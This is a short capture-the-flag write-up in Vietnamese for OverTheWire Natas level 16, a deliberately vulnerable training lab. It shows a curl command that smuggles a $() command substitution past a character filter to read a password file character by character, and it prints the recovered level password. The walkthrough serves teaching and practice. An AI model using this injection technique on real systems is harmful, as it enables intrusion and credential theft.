# Natas 16 → 17

## Mục tiêu

Lấy password của `natas17` qua command injection bị giới hạn ký tự.

## Tôi thấy

Source dùng `passthru("grep -i \"$key\" dictionary.txt")` và filter `; | & \` "`. Command substitution `$()` vẫn dùng được.

## Cách làm

```bash
curl -u natas16:<password> --get \
  --data-urlencode 'needle=$(grep -E ^<prefix> /etc/natas_webpass/natas17)' \
  http://natas16.natas.labs.overthewire.org/
```

Prefix đúng khiến command substitution trả password, nên grep bên ngoài không in dictionary. Prefix sai khiến grep in dictionary; kích thước response là oracle.

## Vì sao cách này hiệu quả

Filter không chặn `$()`. Thử từng ký tự và so sánh response cho phép khôi phục password mà không cần đọc trực tiếp file.

## Kết quả

Password của `natas17`:

```text
KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
```

